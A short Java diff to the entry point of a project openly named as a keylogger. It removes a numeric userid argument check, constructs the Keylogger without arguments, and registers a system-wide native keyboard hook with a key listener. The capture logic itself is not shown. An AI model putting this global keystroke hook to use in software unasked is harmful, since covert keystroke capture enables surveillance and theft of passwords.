@@ -6,15 +6,12 @@ public class App
 {
     public static void main( String[] args )
     {
-        if (args.length != 1 || !args[0].matches("\\d+")){
-            System.out.println("Pass a userid which has to be a number!");;
-            System.exit(1);
-        }
         try {
-            Keylogger keylogger = new Keylogger(Long.parseLong(args[0]));
+            Keylogger keylogger = new Keylogger();
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(keylogger);
         } catch (Exception e) {
+            e.printStackTrace();
             System.exit(1);
         }
     }
